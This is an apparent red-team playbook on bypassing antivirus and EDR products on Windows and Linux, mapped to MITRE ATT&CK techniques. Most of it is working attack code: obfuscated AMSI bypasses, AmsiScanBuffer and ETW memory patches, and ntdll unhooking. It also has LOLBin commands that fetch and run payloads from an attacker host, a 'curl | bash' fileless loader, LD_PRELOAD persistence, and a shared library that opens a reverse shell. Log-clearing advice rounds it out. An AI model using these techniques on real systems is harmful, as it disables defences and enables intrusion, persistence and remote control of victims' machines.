# AV/EDR Bypass Techniques

## MITRE ATT&CK Mapping
- **T1562.001** — Disable or Modify Tools (AMSI, EDR unhooking)
- **T1562.002** — Disable Windows Event Logging (ETW patching)
- **T1218** — System Binary Proxy Execution (LOLBins)
- **T1059.001** — Command and Scripting Interpreter: PowerShell
- **T1027** — Obfuscated Files or Information
- **T1620** — Reflective Code Loading (fileless execution)
- **T1574.006** — Hijack Execution Flow: Dynamic Linker Hijacking

---

## 1. Decision Tree: Which Bypass When

| Situation | Action | Reference |
|---|---|---|
| Windows + PowerShell available | AMSI bypass first, then load tools | §2 |
| EDR blocking execution (behavioral) | Unhook ntdll or use direct syscalls | §4 |
| Need to run .NET tooling (Rubeus, SharpHound) | AMSI bypass + ETW patch first | §2 + §3 |
| Can't drop files to disk | LOLBin download + fileless execution | §5 + §7 |
| Linux target with AV (ClamAV, CrowdStrike Falcon) | Compile from source, strip, memfd_create | §6 |
| Need to transfer tools to target | LOLBin download (certutil, bitsadmin) | §5a |
| Need to execute untrusted binary | LOLBin proxy execution (mshta, rundll32) | §5b |
| EDR logging your .NET assembly loads | ETW patch before loading assemblies | §3 |

**Standard Windows bypass sequence:**
```
1. AMSI bypass (§2) → allows PowerShell tooling
2. ETW patch (§3) → blinds .NET assembly load telemetry
3. Unhook ntdll (§4) → removes EDR inline hooks
4. Load offensive tools → Mimikatz, Rubeus, SharpHound
5. Migrate into stable process → see process_injection.md
```

---

## 2. AMSI Bypass (Windows PowerShell)

AMSI inspects PowerShell, VBScript, JScript, and .NET 4.8+ at runtime. Bypass it before loading any offensive tooling in PowerShell.
**Tag MITRE: T1562.001 (Disable or Modify Tools)**

⚠️ **Safety:** AMSI bypass itself can trigger alerts if the bypass string is signature-detected. Always obfuscate.

### 2a. amsiInitFailed — Memory Patch (Matt Graeber Original)

```powershell
# Sets internal flag to indicate AMSI failed to initialize — all scans return clean
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

⚠️ This exact string is signature-detected by Defender as of 2024+. Use obfuscated variants below.

**Verify success:**
```powershell
# Test: this string would normally trigger AMSI
"Invoke-Mimikatz"
# If no alert/block → AMSI is bypassed
# Or explicitly check the field:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
# Expected: True
```

### 2b. String Obfuscation Variants (Evade Signatures)

```powershell
# Variant 1: String concatenation to break signature
$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$f=$a.GetField('amsi'+'Init'+'Failed','NonPublic,Static')
$f.SetValue($null,$true)
```

```powershell
# Variant 2: Character replacement
$w = 'System.Management.Automation.A]m]s]i]U]t]i]l]s'.Replace(']','')
[Ref].Assembly.GetType($w).GetField('a]m]s]i]I]n]i]t]F]a]i]l]e]d'.Replace(']',''),'NonPublic,Static').SetValue($null,$true)
```

```powershell
# Variant 3: Runtime variable assembly (different each execution)
$x="Am"; $y="si"; $z="Utils"; $q="Init"; $r="Failed"
[Ref].Assembly.GetType("System.Management.Automation.$x$y$z").GetField("am$($y.ToLower())$q$r",'NonPublic,Static').SetValue($null,$true)
```

**Tag MITRE: T1562.001, T1027.010 (Command Obfuscation)**

### 2c. AmsiScanBuffer Patch (CLR Hooking)

Patches the actual `AmsiScanBuffer` function in `amsi.dll` to return `E_INVALIDARG` — more robust than flag manipulation.

```powershell
$Win32 = @"
using System; using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$addr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$p = 0; [Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
# x64: mov eax, 0x80070057 (E_INVALIDARG); ret — causes AMSI to skip the scan
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $addr, 6)
```

**Verify success:**
```powershell
# Read the first bytes back — should be B8 57 00 07 80 C3
[byte[]]$check = New-Object byte[] 6
[System.Runtime.InteropServices.Marshal]::Copy($addr, $check, 0, 6)
[BitConverter]::ToString($check)
# Expected: "B8-57-00-07-80-C3"
```

⚠️ **Note:** Add-Type compiles C# at runtime — this can be logged by ScriptBlock Logging. Disable ETW first (§3) if stealth is critical.

**Tag MITRE: T1562.001**

### 2d. Context Nullification (PowerShell 5.1+)

```powershell
# Set AMSI context pointer to zero — AMSI functions fail gracefully
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
```

**Verify:** Same test as §2a — try loading a known-flagged string.

---

## 3. ETW Patching

ETW (Event Tracing for Windows) feeds telemetry to EDR products — assembly loads, PowerShell execution, network activity. Patching it blinds defenders to your activity.
**Tag MITRE: T1562.002 (Disable Windows Event Logging)**

⚠️ **Safety:** Patching ETW may cause instability in some EDR agents that depend on ETW callbacks. Test in staging first.

### 3a. Patch ntdll!EtwEventWrite

```powershell
# Prerequisite: Add-Type from §2c (Win32 class with LoadLibrary, GetProcAddress, VirtualProtect)
$ntdll = [Win32]::LoadLibrary("ntdll.dll")
$etwAddr = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
$p = 0; [Win32]::VirtualProtect($etwAddr, [uint32]1, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xC3)  # 0xC3 = ret (return immediately)
```

**Verify success:**
```powershell
# Read first byte of EtwEventWrite — should be 0xC3 (ret)
[System.Runtime.InteropServices.Marshal]::ReadByte($etwAddr)
# Expected: 195 (0xC3)
```

**Tag MITRE: T1562.002**

### 3b. .NET ETW Provider Bypass (PowerShell)

Prevents .NET assembly load events from being logged — critical before loading SharpHound, Rubeus, etc.

```powershell
# Replace the PSEtwLogProvider's internal provider with a dummy that logs nowhere
[Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null
$etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwField = $etwProvider.GetField('etwProvider','NonPublic,Static')
$eventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
$etwField.SetValue($null, $eventProvider)
```

**Verify success:**
```powershell
# After patching, load a .NET assembly and check Windows Event Viewer:
# Applications and Services Logs → Microsoft → Windows → PowerShell → Operational
# Should NOT show "Loading assembly" events for your loaded tools
```

**Tag MITRE: T1562.002**

### 3c. C# ETW Concept (for custom tooling)

```csharp
// In your C# implant/tool, patch ETW before doing anything sensitive:
// 1. P/Invoke to get EtwEventWrite address from ntdll
// 2. VirtualProtect to make it writable
// 3. Write 0xC3 (ret) as first byte
// This prevents ALL ETW events from the current process, including:
//   - .NET assembly loads
//   - Network connection events
//   - Process creation events visible to EDR
```

---

## 4. Ntdll Unhooking

EDR products hook ntdll.dll syscall stubs (e.g., `NtAllocateVirtualMemory` → `JMP edragent.dll`). Unhooking restores clean syscall paths.
**Tag MITRE: T1562.001 (Disable or Modify Tools)**

⚠️ **Safety:** Unhooking may trigger EDR tamper protection alerts on some products. Some EDRs periodically re-hook — may need to unhook again.

### 4a. Fresh Copy from Disk

```
Concept:
1. Read C:\Windows\System32\ntdll.dll from disk (unhooked original)
2. Parse PE headers to find .text section RVA + size
3. In the currently loaded ntdll, VirtualProtect .text to PAGE_EXECUTE_READWRITE
4. memcpy clean .text bytes over the hooked .text section
5. VirtualProtect back to PAGE_EXECUTE_READ
Result: ALL EDR inline hooks in ntdll are removed
```

```powershell
# PowerShell proof of concept (concept — production tools use C#/C++)
$clean = [IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
# Parse PE: DOS header → NT headers → section headers → find .text
# Then Marshal.Copy the clean .text section over the loaded copy
# Tools that implement this: SharpUnhooker, RefleXXion, Dumpert
```

**Verify success:**
```powershell
# Compare first bytes of a known-hooked function before and after
# If NtAllocateVirtualMemory starts with 4C 8B D1 B8 (mov r10, rcx; mov eax, SSN)
# instead of E9 xx xx xx xx (jmp — the EDR hook), unhooking worked
$ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object { $_.ModuleName -eq "ntdll.dll" }
# Read first 5 bytes of NtAllocateVirtualMemory — should NOT start with 0xE9 (JMP)
```

**Tag MITRE: T1562.001**

### 4b. Direct Syscalls (SysWhispers / Hell's Gate)

Skip ntdll entirely — invoke kernel syscalls directly from your code.

```
; x64 direct syscall stub (NtAllocateVirtualMemory)
; Syscall number varies by Windows build! Use SysWhispers3 to auto-resolve.
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 0x18          ; SSN for Windows 10 21H2 — VERIFY FOR TARGET OS
    syscall
    ret
NtAllocateVirtualMemory ENDP
```

**Tools:**
- **SysWhispers3** — generates .asm + .h files with correct syscall numbers per OS build
- **Hell's Gate** — dynamically resolves SSNs at runtime from ntdll (even if hooked)
- **Halo's Gate** — if target stub is hooked, reads neighboring clean stubs to calculate SSN
- **Dumpert** — combines unhooking + direct syscalls for credential dumping

**Verify success:**
```
# If your direct-syscall tool executes without EDR killing the process,
# and performs its function (e.g., allocates memory, creates thread),
# the direct syscalls are working and bypassing EDR hooks.
```

**Tag MITRE: T1562.001**

---

## 5. LOLBins — Living Off the Land

Signed Windows binaries that proxy download, execution, or UAC bypass. They're trusted by default — EDRs have a harder time flagging legitimate Microsoft binaries.
Full catalog: https://lolbas-project.github.io/
**Tag MITRE: T1218 (System Binary Proxy Execution)**

### 5a. Download Techniques

```cmd
:: Certutil — download file (T1105, T1218)
certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Windows\Temp\payload.exe
:: Verify: dir C:\Windows\Temp\payload.exe

:: BITSAdmin — background intelligent transfer (T1105, T1197)
bitsadmin /transfer myJob /download /priority high http://ATTACKER/payload.exe C:\Windows\Temp\payload.exe
:: Verify: bitsadmin /info myJob /verbose

:: PowerShell one-liner (T1059.001, T1105)
powershell -ep bypass -c "IWR http://ATTACKER/p.exe -OutFile C:\Windows\Temp\p.exe"
:: Verify: powershell -c "Get-FileHash C:\Windows\Temp\p.exe"

:: CertReq — exfil or download via cert request (T1105)
certreq -Post -config http://ATTACKER/upload C:\Windows\Temp\data.txt
```

**Tag MITRE: T1105 (Ingress Tool Transfer), T1218**

### 5b. Execution / Proxy Execution

```cmd
:: MSHTA — execute HTA payload, runs outside browser sandbox (T1218.005)
mshta http://ATTACKER/payload.hta
:: Verify: tasklist | findstr mshta

:: Rundll32 — execute JavaScript inline (T1218.011)
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")
:: Verify: tasklist | findstr rundll32

:: Regsvr32 — Squiblydoo: fetch + exec SCT file, bypasses AppLocker (T1218.010)
regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll
:: Verify: check callback on attacker listener

:: WMIC — remote process creation (T1047)
wmic process call create "cmd /c C:\Windows\Temp\payload.exe"
:: Verify: wmic process where "name='payload.exe'" get processid

:: MSIExec — install remote MSI package (T1218.007)
msiexec /q /i http://ATTACKER/payload.msi
:: Verify: check for payload execution on attacker side

:: CMSTP — INF-based execution, can bypass UAC (T1218.003)
cmstp /ni /s C:\Windows\Temp\payload.inf
:: Verify: check process tree for cmstp child processes

:: Mavinject — DLL injection into running process (T1218.013)
mavinject.exe <PID> /INJECTRUNNING C:\Windows\Temp\payload.dll
:: Verify: tasklist /m payload.dll
```

**Tag MITRE: T1218 and sub-techniques as noted**

### 5c. Compile on Target (T1127)

```cmd
:: C# compiler — compile payload from dropped source
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\tool.exe C:\Windows\Temp\tool.cs
:: Verify: C:\Windows\Temp\tool.exe --version

:: MSBuild — execute inline C# task from XML project file (T1127.001)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\build.xml
:: Verify: check MSBuild output for task execution
```

**Tag MITRE: T1127 (Trusted Developer Utilities Proxy Execution)**

---

## 6. Linux AV Evasion

**Tag MITRE: T1027 (Obfuscated Files or Information), T1059.004 (Unix Shell)**

### 6a. Binary Preparation

```bash
# Compile from source on target — avoids dropping precompiled binary signatures
gcc -o /tmp/.tool payload.c -s -static  # -s strips, -static avoids library deps
# Verify: file /tmp/.tool && ldd /tmp/.tool  # should show "not a dynamic executable"

# Strip symbols from existing binary (removes function names, debug info)
strip --strip-all payload
# Verify: nm payload 2>&1 | head  # should show "no symbols"

# UPX packing — polymorphic compression changes byte pattern
upx --best --ultra-brute payload -o payload.packed
# Verify: upx -t payload.packed

# Rename ELF sections to break section-name-based signatures
objcopy --rename-section .text=.code --rename-section .data=.rdata payload
# Verify: readelf -S payload | grep -E "code|rdata"
```

**Tag MITRE: T1027, T1027.002 (Software Packing)**

### 6b. Fileless Execution

```bash
# memfd_create — create anonymous in-memory file, execute without touching disk
python3 -c "
import ctypes, os
fd = ctypes.CDLL('libc.so.6').memfd_create(b'', 0)
os.write(fd, open('/dev/shm/.payload','rb').read())
os.execve(f'/proc/self/fd/{fd}', ['[kworker/0:0]'], dict(os.environ))
"
# Verify: ls -la /proc/<pid>/exe → shows (deleted) or memfd link
# Verify: cat /proc/<pid>/maps | grep memfd

# Download and execute in memory — never touches disk
curl -s http://ATTACKER/payload | bash
# Verify: check callback on attacker listener

# Perl fileless
curl -s http://ATTACKER/payload.pl | perl
```

⚠️ **Safety:** memfd_create leaves traces in /proc. Some EDRs (Falcon) monitor memfd_create syscalls.

**Tag MITRE: T1620 (Reflective Code Loading)**

### 6c. Shared Library Injection

```bash
# LD_PRELOAD — inject shared library into target process launch
export LD_PRELOAD=/tmp/.helper.so
/usr/bin/target_binary
# Verify: ldd /usr/bin/target_binary | grep helper

# Persistent LD_PRELOAD — affects ALL dynamically-linked programs (requires root)
echo "/tmp/.helper.so" >> /etc/ld.so.preload
# Verify: cat /etc/ld.so.preload

# Compile evil.so with constructor (runs when library loads)
cat > /tmp/evil.c << 'EOF'
#include <stdlib.h>
__attribute__((constructor)) void init() {
    system("bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' &");
}
EOF
gcc -shared -fPIC -o /tmp/.helper.so /tmp/evil.c -ldl -nostartfiles
# Verify: file /tmp/.helper.so  # should show "shared object"
```

**Tag MITRE: T1574.006 (Dynamic Linker Hijacking)**

---

## 7. Detection Avoidance — General OPSEC

**Tag MITRE: T1071.001 (Web Protocols), T1573 (Encrypted Channel), T1029 (Scheduled Transfer)**

| Principle | Technique | Verify |
|---|---|---|
| Stay fileless | Execute from memory; avoid writes to disk | `ls -la` target dirs — no new files |
| Encrypt C2 | HTTPS (443), DNS-over-HTTPS, domain fronting | `tcpdump` — traffic should be TLS-encrypted |
| Blend traffic | Use ports 80/443; mimic browser User-Agent | Wireshark — C2 looks like normal browsing |
| Timing | Operate during business hours (09:00–17:00 local) | Check target timezone first |
| Process selection | Inject into expected processes (svchost, browser) | `tasklist` — your payload PID matches expected process name |
| Log evasion | Patch ETW, clear event logs, disable Sysmon | `wevtutil qe Security /c:5` — no alerts for your actions |
| Signature evasion | Obfuscate strings, encrypt payloads, custom loaders | See payload_obfuscation.md |
| AMSI/ETW first | Always bypass AMSI + ETW BEFORE loading offensive tools | Test with flagged string before loading tools |

---

## 8. Evidence Collection

```bash
# Record every bypass technique used for cleanup and reporting
echo "=== AV/EDR Bypass Log ===" >> evidence/evasion_log.txt
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/evasion_log.txt
echo "Target: <hostname/IP>" >> evidence/evasion_log.txt
echo "Technique: <AMSI bypass / ETW patch / ntdll unhook / LOLBin>" >> evidence/evasion_log.txt
echo "MITRE: <T1562.001 / T1562.002 / T1218.xxx>" >> evidence/evasion_log.txt
echo "Command: <exact command or script used>" >> evidence/evasion_log.txt
echo "Result: <success/failure + verification output>" >> evidence/evasion_log.txt
echo "Cleanup: <reversal steps if applicable>" >> evidence/evasion_log.txt
echo "---" >> evidence/evasion_log.txt
```

---

## References
- MITRE T1562.001: https://attack.mitre.org/techniques/T1562/001/
- MITRE T1562.002: https://attack.mitre.org/techniques/T1562/002/
- MITRE T1218: https://attack.mitre.org/techniques/T1218/
- LOLBAS Project: https://lolbas-project.github.io/
- SysWhispers3: https://github.com/klezVirus/SysWhispers3
- Donut (shellcode generator): https://github.com/TheWover/donut
